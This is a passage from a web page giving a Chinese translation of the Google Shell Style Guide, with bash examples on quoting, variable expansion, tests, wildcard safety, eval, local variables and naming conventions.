<li>可用一行替代的，需要在右括号后面和 <code>;;</code> 号前面添加一个空格。</li>
<li>对于长的，有多个命令的，应该分割成多行，其中匹配项，对于匹配项的处理以及 <code>;;</code> 号各自在单独的行。</li>
</ul>
<p>case 和 esac 中匹配项的表达式应该都在同一个缩进级别，匹配项的（多行）处理也应该在另一个缩进级别。通常来说，没有必要给匹配项的表达式添加引号。匹配项的表达式不应该在前面加一个左括号，避免使用 <code>;&amp;</code> 和 <code>;;s&amp;</code> 等符号.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$&#123;expression&#125;</span>"</span> <span class="keyword">in</span></span><br><span class="line">  a)</span><br><span class="line">    variable=<span class="string">"..."</span></span><br><span class="line">    some_command <span class="string">"<span class="variable">$&#123;variable&#125;</span>"</span> <span class="string">"<span class="variable">$&#123;other_expr&#125;</span>"</span> ...</span><br><span class="line">    ;;</span><br><span class="line">  absolute)</span><br><span class="line">    actions=<span class="string">"relative"</span></span><br><span class="line">    another_command <span class="string">"<span class="variable">$&#123;actions&#125;</span>"</span> <span class="string">"<span class="variable">$&#123;other_expr&#125;</span>"</span> ...</span><br><span class="line">    ;;</span><br><span class="line">  *)</span><br><span class="line">    error <span class="string">"Unexpected expression '<span class="variable">$&#123;expression&#125;</span>'"</span></span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>
<p>对于一些简单的匹配项处理操作，可以和匹配项表达式以及 <code>;;</code> 号在同一行,只要表达式仍然可读。这通常适合单字符的选项处理，当匹配项处理操作不能满足单行的情况下，可以将匹配项表达式单独放在一行，匹配项处理操作和 <code>;;</code> 放在同一行，当匹配项操作和匹配项表达式以及 <code>;;</code> 放在同一行的时候在匹配项表达式右括号后面以及 <code>;;</code> 前面放置一个空格。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">verbose=<span class="string">'false'</span></span><br><span class="line">aflag=<span class="string">''</span></span><br><span class="line">bflag=<span class="string">''</span></span><br><span class="line">files=<span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> <span class="string">'abf:v'</span> flag; <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">"<span class="variable">$&#123;flag&#125;</span>"</span> <span class="keyword">in</span></span><br><span class="line">    a) aflag=<span class="string">'true'</span> ;;</span><br><span class="line">    b) bflag=<span class="string">'true'</span> ;;</span><br><span class="line">    f) files=<span class="string">"<span class="variable">$&#123;OPTARG&#125;</span>"</span> ;;</span><br><span class="line">    v) verbose=<span class="string">'true'</span> ;;</span><br><span class="line">    *) error <span class="string">"Unexpected option <span class="variable">$&#123;flag&#125;</span>"</span> ;;</span><br><span class="line">  <span class="keyword">esac</span></span><br><span class="line">don</span><br></pre></td></tr></table></figure>
<h2 id="变量扩展-Variable-expansion"><a href="#变量扩展-Variable-expansion" class="headerlink" title="变量扩展(Variable expansion)"></a>变量扩展(Variable expansion)</h2><p>按优先级顺序：保持跟你所发现的一致；把你的变量用括号印起来；推荐用 <code>&quot;${var}&quot;</code> 而不是 <code>&quot;$var&quot;</code>，详细解释如下。</p>
<p>这些仅仅是指南，因为按标题作为强制的规定饱受争议。<br>以下按照优先顺序列出。</p>
<ol>
<li>与现存代码中你所发现的保持一致。</li>
<li>把变量用（大）扩号引起来，参阅下面一节：<a href="#Quoting">引用</a>。</li>
<li>除非绝对必要或者为了避免深深的困惑，否则不要用大括号将单个字符的 Shell 特殊变量或位置参数括起来。推荐将其他所有变量用大括号括起来。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Section of recommended cases.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Preferred style for 'special' variables:</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Positional: <span class="variable">$1</span>"</span> <span class="string">"<span class="variable">$5</span>"</span> <span class="string">"<span class="variable">$3</span>"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Specials: !=$!, -=$-, _=<span class="variable">$_</span>. ?=$?, #=<span class="variable">$#</span> *=$* @=<span class="variable">$@</span> \$=$$ ..."</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Braces necessary:</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"many parameters: <span class="variable">$&#123;10&#125;</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Braces avoiding confusion:</span></span><br><span class="line"><span class="comment"># Output is "a0b0c0"</span></span><br><span class="line"><span class="built_in">set</span> -- a b c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$&#123;1&#125;</span>0<span class="variable">$&#123;2&#125;</span>0<span class="variable">$&#123;3&#125;</span>0"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Preferred style for other variables:</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"PATH=<span class="variable">$&#123;PATH&#125;</span>, PWD=<span class="variable">$&#123;PWD&#125;</span>, mine=<span class="variable">$&#123;some_var&#125;</span>"</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> f; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"file=<span class="variable">$&#123;f&#125;</span>"</span></span><br><span class="line"><span class="keyword">done</span> &lt; &lt;(ls -l /tmp)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Section of discouraged cases</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Unquoted vars, unbraced vars, brace-quoted single letter</span></span><br><span class="line"><span class="comment"># shell specials.</span></span><br><span class="line"><span class="built_in">echo</span> a=<span class="variable">$avar</span> <span class="string">"b=<span class="variable">$bvar</span>"</span> <span class="string">"PID=<span class="variable">$&#123;$&#125;</span>"</span> <span class="string">"<span class="variable">$&#123;1&#125;</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Confusing use: this is expanded as "$&#123;1&#125;0$&#123;2&#125;0$&#123;3&#125;0",</span></span><br><span class="line"><span class="comment"># not "$&#123;10&#125;$&#123;20&#125;$&#123;30&#125;</span></span><br><span class="line"><span class="built_in">set</span> -- a b c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$10</span><span class="variable">$20</span><span class="variable">$30</span>"</span></span><br></pre></td></tr></table></figure>
<h2 id="引用-Quoting"><a href="#引用-Quoting" class="headerlink" title="引用(Quoting)"></a><span id="Quoting">引用(Quoting)</span></h2><ul>
<li>除非需要小心不带引用的扩展，否则总是将包含变量、命令替换符、空格或 Shell 元字符的字符串引起来。</li>
<li>优先引用是单词的字符串（而不是命令选项或者路径名）。</li>
<li>不要对整数进行引用。</li>
<li>千万小心 <a href="#Test,%5B_and_%5B%5B">[[ 中模式匹配</a>的引用规则。</li>
<li>请使用 <code>$@</code> 除非你有特殊原因需要使用 <code>$*</code>。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 'Single' quotes indicate that no substitution is desired.</span></span><br><span class="line"><span class="comment"># "Double" quotes indicate that substitution is required/tolerated.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Simple examples</span></span><br><span class="line"><span class="comment"># "quote command substitutions"</span></span><br><span class="line">flag=<span class="string">"<span class="variable">$(some_command and its args "$@" 'quoted separately')</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># "quote variables"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$&#123;flag&#125;</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># "never quote literal integers"</span></span><br><span class="line">value=32</span><br><span class="line"><span class="comment"># "quote command substitutions", even when you expect integers</span></span><br><span class="line">number=<span class="string">"<span class="variable">$(generate_number)</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># "prefer quoting words", not compulsory</span></span><br><span class="line"><span class="built_in">readonly</span> USE_INTEGER=<span class="string">'true'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># "quote shell meta characters"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Hello stranger, and well met. Earn lots of $$$'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Process $$: Done making \$\$\$."</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># "command options or path names"</span></span><br><span class="line"><span class="comment"># ($1 is assumed to contain a value here)</span></span><br><span class="line">grep -li Hugo /dev/null <span class="string">"<span class="variable">$1</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Less simple examples</span></span><br><span class="line"><span class="comment"># "quote variables, unless proven false": ccs might be empty</span></span><br><span class="line">git send-email --to <span class="string">"<span class="variable">$&#123;reviewers&#125;</span>"</span> <span class="variable">$&#123;ccs:+"--cc" "$&#123;ccs&#125;</span><span class="string">"&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Positional parameter precautions: <span class="variable">$1</span> might be unset</span></span><br><span class="line"><span class="string"># Single quotes leave regex as-is.</span></span><br><span class="line"><span class="string">grep -cP '([Ss]pecial|\|?characters*)$' <span class="variable">$&#123;1:+"$1"&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># For passing on arguments,</span></span><br><span class="line"><span class="string"># "</span><span class="variable">$@</span><span class="string">" is right almost everytime, and</span></span><br><span class="line"><span class="string"># $* is wrong almost everytime:</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string"># * $* and <span class="variable">$@</span> will split on spaces, clobbering up arguments</span></span><br><span class="line"><span class="string">#   that contain spaces and dropping empty strings;</span></span><br><span class="line"><span class="string"># * "</span><span class="variable">$@</span><span class="string">" will retain arguments as-is, so no args</span></span><br><span class="line"><span class="string">#   provided will result in no args being passed on;</span></span><br><span class="line"><span class="string">#   This is in most cases what you want to use for passing</span></span><br><span class="line"><span class="string">#   on arguments.</span></span><br><span class="line"><span class="string"># * "</span>$*<span class="string">" expands to one argument, with all args joined</span></span><br><span class="line"><span class="string">#   by (usually) spaces,</span></span><br><span class="line"><span class="string">#   so no args provided will result in one empty string</span></span><br><span class="line"><span class="string">#   being passed on.</span></span><br><span class="line"><span class="string"># (Consult 'man bash' for the nit-grits ;-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">set -- 1 "</span>2 two<span class="string">" "</span>3 three tres<span class="string">"; echo <span class="variable">$#</span> ; set -- "</span>$*<span class="string">"; echo "</span><span class="variable">$#</span>, <span class="variable">$@</span><span class="string">")</span></span><br><span class="line"><span class="string">set -- 1 "</span>2 two<span class="string">" "</span>3 three tres<span class="string">"; echo <span class="variable">$#</span> ; set -- "</span><span class="variable">$@</span><span class="string">"; echo "</span><span class="variable">$#</span>, <span class="variable">$@</span><span class="string">")</span></span><br></pre></td></tr></table></figure>
<h1 id="特征和错误-Features-and-Bugs"><a href="#特征和错误-Features-and-Bugs" class="headerlink" title="特征和错误(Features and Bugs)"></a>特征和错误(Features and Bugs)</h1><h2 id="命令替换-Command-Substitution"><a href="#命令替换-Command-Substitution" class="headerlink" title="命令替换(Command Substitution)"></a>命令替换(Command Substitution)</h2><p>使用 <code>$(command)</code> 而不是反引号。</p>
<p>嵌套的反引号要求用反斜杠(<code>&quot;\&quot;</code>)转义内部的反引号。而 <code>$(command)</code> 形式嵌套时不需要改变，而且更易于阅读。<br>例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This is preferred:</span></span><br><span class="line">var=<span class="string">"<span class="variable">$(command "$(command1)</span>"</span>)<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># This is not:</span></span><br><span class="line"><span class="string">var="</span>`<span class="built_in">command</span> \`command1\``<span class="string">"</span></span><br></pre></td></tr></table></figure>
<h2 id="Test-和-Test-and"><a href="#Test-和-Test-and" class="headerlink" title="Test, [ 和 [[(Test, [ and [[)"></a><span id="Test,[_and_[[">Test, [ 和 [[(Test, [ and [[)</span></h2><p>优先使用 <code>[[ ... ]]</code>，而不是 <code>[</code>, <code>test</code> 和 <code>/usr/bin/[</code>。</p>
<p>因为在 <code>[[</code> 和 <code>]]</code> 之间不会有路径名称扩展或单词分割发生，所以使用 <code>[[ ... ]]</code> 能够减少错误。而且 <code>[[ ... ]]</code> 允许正则表达式匹配，而 <code>[ ... ]</code> 不允许。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This ensures the string on the left is made up of characters in the</span></span><br><span class="line"><span class="comment"># alnum character class followed by the string name.</span></span><br><span class="line"><span class="comment"># Note that the RHS should not be quoted here.</span></span><br><span class="line"><span class="comment"># For the gory details, see</span></span><br><span class="line"><span class="comment"># E14 at http://tiswww.case.edu/php/chet/bash/FAQ</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">"filename"</span> =~ ^[[:alnum:]]+name ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"Match"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This matches the exact pattern "f*" (Does not match in this case)</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">"filename"</span> == <span class="string">"f*"</span> ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"Match"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This gives a "too many arguments" error as f* is expanded to the</span></span><br><span class="line"><span class="comment"># contents of the current directory</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"filename"</span> == f* ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"Match"</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<h2 id="测试字符串-Testing-Strings"><a href="#测试字符串-Testing-Strings" class="headerlink" title="测试字符串(Testing Strings)"></a>测试字符串(Testing Strings)</h2><p>尽可能使用引用，而不是过滤字符串。<br>Bash 足以在测试中处理空字符串。所以，请使用空（非空）字符串测试，而不是过滤字符，使得代码更易于阅读。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Do this:</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">"<span class="variable">$&#123;my_var&#125;</span>"</span> = <span class="string">"some_string"</span> ]]; <span class="keyword">then</span></span><br><span class="line">  do_something</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -z (string length is zero) and -n (string length is not zero) are</span></span><br><span class="line"><span class="comment"># preferred over testing for an empty string</span></span><br><span class="line"><span class="keyword">if</span> [[ -z <span class="string">"<span class="variable">$&#123;my_var&#125;</span>"</span> ]]; <span class="keyword">then</span></span><br><span class="line">  do_something</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This is OK (ensure quotes on the empty side), but not preferred:</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">"<span class="variable">$&#123;my_var&#125;</span>"</span> = <span class="string">""</span> ]]; <span class="keyword">then</span></span><br><span class="line">  do_something</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Not this:</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">"<span class="variable">$&#123;my_var&#125;</span>X"</span> = <span class="string">"some_stringX"</span> ]]; <span class="keyword">then</span></span><br><span class="line">  do_something</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>为了避免对你测试的目的产生困惑，请明确使用 <code>-z</code> 或者 <code>-n</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Use this</span></span><br><span class="line"><span class="keyword">if</span> [[ -n <span class="string">"<span class="variable">$&#123;my_var&#125;</span>"</span> ]]; <span class="keyword">then</span></span><br><span class="line">  do_something</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Instead of this as errors can occur if $&#123;my_var&#125; expands to a test</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">"<span class="variable">$&#123;my_var&#125;</span>"</span> ]]; <span class="keyword">then</span></span><br><span class="line">  do_something</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<h2 id="文件名的通配符扩展-Wildcard-Expansion-of-Filenames"><a href="#文件名的通配符扩展-Wildcard-Expansion-of-Filenames" class="headerlink" title="文件名的通配符扩展(Wildcard Expansion of Filenames)"></a>文件名的通配符扩展(Wildcard Expansion of Filenames)</h2><p>当做文件名通配符扩展的时候，使用显式路径。</p>
<p>因为文件名可以使用 <code>-</code> 开头，所以使用扩展通配符 <code>./*</code> 比 <code>*</code> 安全得多。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Here's the contents of the directory:</span></span><br><span class="line"><span class="comment"># 当前目录下又-f -r somedir somefile等文件和目录</span></span><br><span class="line"><span class="comment"># -f  -r  somedir  somefile</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用rm -v *将会扩展成rm -v -r -f somedir simefile，这将导致删除当前目录所有的文件和目录</span></span><br><span class="line"><span class="comment"># This deletes almost everything in the directory by force</span></span><br><span class="line">psa@bilby$ rm -v *</span><br><span class="line">removed directory: `somedir<span class="string">'</span></span><br><span class="line"><span class="string">removed `somefile'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#相反如果你使用./*则不会，因为-r -f就不会变成rm的参数了</span></span><br><span class="line"><span class="comment"># As opposed to:</span></span><br><span class="line">psa@bilby$ rm -v ./*</span><br><span class="line">removed `./-f<span class="string">'</span></span><br><span class="line"><span class="string">removed `./-r'</span></span><br><span class="line">rm: cannot remove `./somedir<span class="string">': Is a directory</span></span><br><span class="line"><span class="string">removed `./somefile'</span></span><br></pre></td></tr></table></figure>
<h2 id="Eval"><a href="#Eval" class="headerlink" title="Eval"></a>Eval</h2><p><code>eval</code> 命令应该被禁止执行。</p>
<p>eval 用于给变量赋值的时候，可以设置变量，但是不能检查这些变量是什么。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># What does this set?</span></span><br><span class="line"><span class="comment"># Did it succeed? In part or whole?</span></span><br><span class="line"><span class="built_in">eval</span> $(set_my_variables)</span><br><span class="line"></span><br><span class="line"><span class="comment"># What happens if one of the returned values has a space in it?</span></span><br><span class="line">variable=<span class="string">"<span class="variable">$(eval some_function)</span>"</span></span><br></pre></td></tr></table></figure>
<h2 id="管道导向-while-循环-Pipes-to-While"><a href="#管道导向-while-循环-Pipes-to-While" class="headerlink" title="管道导向 while 循环(Pipes to While)"></a>管道导向 while 循环(Pipes to While)</h2><p>优先使用过程替换或者 for 循环，而不是管道导向 while 循环。在 while 循环中被修改的变量是不能传递给父 Shell 的，因为循环命令是在一个子 Shell 中运行的。</p>
<p>管道导向 while 循环中的隐式子 Shell 使得追踪 bug 变得很困难。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">last_line=<span class="string">'NULL'</span></span><br><span class="line">your_command | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span></span><br><span class="line">  last_line=<span class="string">"<span class="variable">$&#123;line&#125;</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This will output 'NULL'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$&#123;last_line&#125;</span>"</span></span><br></pre></td></tr></table></figure>
<p>如果你确定输入中不包含空格或者特殊符号（通常意味着不是用户输入的），那么可以使用一个 for 循环。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">total=0</span><br><span class="line"><span class="comment"># Only do this if there are no spaces in return values.</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> $(<span class="built_in">command</span>); <span class="keyword">do</span></span><br><span class="line">  total+=<span class="string">"<span class="variable">$&#123;value&#125;</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>使用过程替换允许重定向输出，但是请将命令放入一个显式的子 Shell 中，而不是 bash 为 while 循环创建的隐式子 Shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">total=0</span><br><span class="line">last_file=</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> count filename; <span class="keyword">do</span></span><br><span class="line">  total+=<span class="string">"<span class="variable">$&#123;count&#125;</span>"</span></span><br><span class="line">  last_file=<span class="string">"<span class="variable">$&#123;filename&#125;</span>"</span></span><br><span class="line"><span class="keyword">done</span> &lt; &lt;(your_command | uniq -c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This will output the second field of the last line of output from</span></span><br><span class="line"><span class="comment"># the command.</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Total = <span class="variable">$&#123;total&#125;</span>"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Last one = <span class="variable">$&#123;last_file&#125;</span>"</span></span><br></pre></td></tr></table></figure>
<p>当不需要传递复杂的结果给父 Shell 时可以使用 while 循环。这通常需要一些更复杂的“解析”。请注意简单的例子使用如 awk 这类工具可能更容易完成。当你特别不希望改变父 Shell 的范围变量时这可能也是有用的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Trivial implementation of awk expression:</span></span><br><span class="line"><span class="comment">#   awk '$3 == "nfs" &#123; print $2 " maps to " $1 &#125;' /proc/mounts</span></span><br><span class="line">cat /proc/mounts | <span class="keyword">while</span> <span class="built_in">read</span> src dest <span class="built_in">type</span> opts rest; <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="variable">$&#123;type&#125;</span> == <span class="string">"nfs"</span> ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"NFS <span class="variable">$&#123;dest&#125;</span> maps to <span class="variable">$&#123;src&#125;</span>"</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h1 id="命名约定-Naming-Conventions"><a href="#命名约定-Naming-Conventions" class="headerlink" title="命名约定(Naming Conventions)"></a>命名约定(Naming Conventions)</h1><h2 id="函数名-Function-Names"><a href="#函数名-Function-Names" class="headerlink" title="函数名(Function Names)"></a>函数名(Function Names)</h2><p>使用小写字母，并用下划线分隔单词。使用双冒号 <code>::</code> 分隔库。函数名之后必须有圆括号。关键词 function 是可选的，但必须在一个项目中保持一致。</p>
<p>如果你正在写单个函数，请用小写字母来命名，并用下划线分隔单词。如果你正在写一个包，使用双冒号 <code>::</code> 来分隔包名。大括号必须和函数名位于同一行（就像在 Google 的其他语言一样），并且函数名和圆括号之间没有空格。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Single function</span></span><br><span class="line"><span class="function"><span class="title">my_func</span></span>() &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Part of a package</span></span><br><span class="line">mypackage::<span class="function"><span class="title">my_func</span></span>() &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当函数名后存在 <code>()</code> 时，关键词 function 是多余的。但是其促进了函数的快速辨识。</p>
<h2 id="变量名-Variable-Names"><a href="#变量名-Variable-Names" class="headerlink" title="变量名(Variable Names)"></a>变量名(Variable Names)</h2><p>如函数名。</p>
<p>循环的变量名应该和要循环的任何变量同样命名。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> zone <span class="keyword">in</span> <span class="variable">$&#123;zones&#125;</span>; <span class="keyword">do</span></span><br><span class="line">  something_with <span class="string">"<span class="variable">$&#123;zone&#125;</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h2 id="常量和环境变量名-Constants-and-Environment-Variable-Names"><a href="#常量和环境变量名-Constants-and-Environment-Variable-Names" class="headerlink" title="常量和环境变量名(Constants and Environment Variable Names)"></a>常量和环境变量名(Constants and Environment Variable Names)</h2><p>要大写、用下划线分割、声明在文件的开头。</p>
<p>常量和任何导出到环境的变量都应该大写。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Constant</span></span><br><span class="line"><span class="built_in">readonly</span> PATH_TO_FILES=<span class="string">'/some/path'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Both constant and environment</span></span><br><span class="line"><span class="comment"># declare -r设置只读变量，-x设置为环境变量</span></span><br><span class="line"><span class="built_in">declare</span> -xr ORACLE_SID=<span class="string">'PROD'</span></span><br></pre></td></tr></table></figure>
<p>有些第一次设置时(例如使用 getopts 情况下)就变成了常量。也就是说，可以在 getopts 中或基于条件来设定常量，但之后应该立即设置其为只读。需要注意的是，<code>declare</code> 不能在函数内部操作全局变量，所以这时推荐使用 <code>readonly</code> 和 <code>export</code> 来代替。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">VERBOSE=<span class="string">'false'</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> <span class="string">'v'</span> flag; <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">"<span class="variable">$&#123;flag&#125;</span>"</span> <span class="keyword">in</span></span><br><span class="line">    v) VERBOSE=<span class="string">'true'</span> ;;</span><br><span class="line">  <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">readonly</span> VERBOSE</span><br></pre></td></tr></table></figure>
<h2 id="源文件名-Source-Filenames"><a href="#源文件名-Source-Filenames" class="headerlink" title="源文件名(Source Filenames)"></a>源文件名(Source Filenames)</h2><p>小写，如果需要的话使用下划线分隔单词。</p>
<p>这是为了和在 Google 中的其他代码风格保持一致：<code>maketemplate</code> 或者 <code>make_template</code>，而不是 <code>make-template</code>。</p>
<h2 id="只读变量-Read-ony-Variables"><a href="#只读变量-Read-ony-Variables" class="headerlink" title="只读变量(Read-ony Variables)"></a>只读变量(Read-ony Variables)</h2><p>使用 <code>readonly</code> 或者 <code>declare -r</code> 来确保变量只读。</p>
<p>因为全局变量在 Shell 中广泛使用，所以在使用它们的过程中捕获错误是很重要的。当你声明了一个希望其只读的变量，那么请明确指出。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zip_version=<span class="string">"<span class="variable">$(dpkg --status zip | grep Version: | cut -d ' ' -f 2)</span>"</span></span><br><span class="line"><span class="keyword">if</span> [[ -z <span class="string">"<span class="variable">$&#123;zip_version&#125;</span>"</span> ]]; <span class="keyword">then</span></span><br><span class="line">  error_message</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">readonly</span> zip_version</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<h2 id="使用本地变量-Use-Local-Variables"><a href="#使用本地变量-Use-Local-Variables" class="headerlink" title="使用本地变量(Use Local Variables)"></a>使用本地变量(Use Local Variables)</h2><p>使用 local 声明函数内部变量。声明和赋值应该在不同行。</p>
<p>使用 local 来声明局部变量以确保其只在函数内部和子函数中可见。这避免了污染全局命名空间和不经意间设置可能具有函数之外重要意义的变量。</p>
<p>当赋值的值由命令替换提供时，声明和赋值必须分开。因为内建的 local 不会从命令替换中传递退出码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">my_func2</span></span>() &#123;</span><br><span class="line">  <span class="built_in">local</span> name=<span class="string">"<span class="variable">$1</span>"</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Separate lines for declaration and assignment:</span></span><br><span class="line">  <span class="built_in">local</span> my_var</span><br><span class="line">  my_var=<span class="string">"<span class="variable">$(my_func)</span>"</span> || <span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># DO NOT do this: $? contains the exit code of 'local', not my_func</span></span><br><span class="line">  <span class="built_in">local</span> my_var=<span class="string">"<span class="variable">$(my_func)</span>"</span></span><br><span class="line">  [[ $? -eq 0 ]] || <span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="函数位置-Function-Location"><a href="#函数位置-Function-Location" class="headerlink" title="函数位置(Function Location)"></a>函数位置(Function Location)</h2><p>将文件中所有的函数一起放在常量下面。不要在函数之间隐藏可执行代码。</p>
<p>如果你有函数，请将他们一起放在文件头部。只有 <code>includes</code>，<code>set</code> 语句和设置常数可能在函数定义前完成。<br>不要在函数之间隐藏可执行代码。如果那样做，会使得代码在调试时难以跟踪并出现意想不到的讨厌结果。</p>
<h2 id="主函数-main"><a href="#主函数-main" class="headerlink" title="主函数(main)"></a>主函数(main)</h2><p>对于足够长的脚本来说，至少需要一个名为 main 的函数来调用其它的函数。</p>
<p>为了便于找到程序的起始位置，把主程序放在一个叫 main 的函数中，放在其它函数的下面，为了提供一致性你应该定义更多的变量为本地变量(如果主程序不是一个程序，那么不能这么做)，文件中最后一句非注释行应该是一个 main 函数的调用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">main <span class="string">"<span class="variable">$@</span>"</span></span><br></pre></td></tr></table></figure>
<h1 id="调用命令-Calling-Commands"><a href="#调用命令-Calling-Commands" class="headerlink" title="调用命令(Calling Commands)"></a>调用命令(Calling Commands)</h1><h2 id="检查返回值-Checking-Return-Values"><a href="#检查返回值-Checking-Return-Values" class="headerlink" title="检查返回值(Checking Return Values)"></a>检查返回值(Checking Return Values)</h2><p>总是应该检查返回值，给出返回值相关的信息。</p>
<p>对于一个未使用管道的命令，可以使用 <code>$?</code> 或者直接指向 <code>if</code> 语句来检查其返回值<br>例子:</p>
